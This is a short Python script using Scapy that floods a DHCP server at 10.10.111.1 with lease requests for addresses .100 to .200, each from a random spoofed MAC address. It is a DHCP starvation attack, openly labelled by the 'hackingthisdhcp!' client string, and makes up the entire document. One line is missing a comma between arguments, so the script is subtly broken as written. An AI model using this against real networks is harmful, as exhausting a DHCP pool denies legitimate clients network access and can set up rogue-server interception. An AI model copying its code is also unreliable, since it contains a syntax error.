#! /usr/bin/env python
from scapy.all import *
import sys
import time
from time import *
conf.checkIPaddr = False
i=100
while (i<201):
		x="10.10.111.%d" %(i)
		dhcp_pkt = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0" dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'hackingthisdhcp!'))/DHCP(options=[("message-type","request"),("request_addr", x),("server_id","10.10.111.1"),("lease_time",86400), "end"])
		i=i+1
		sendp(dhcp_pkt)
		sleep(1)
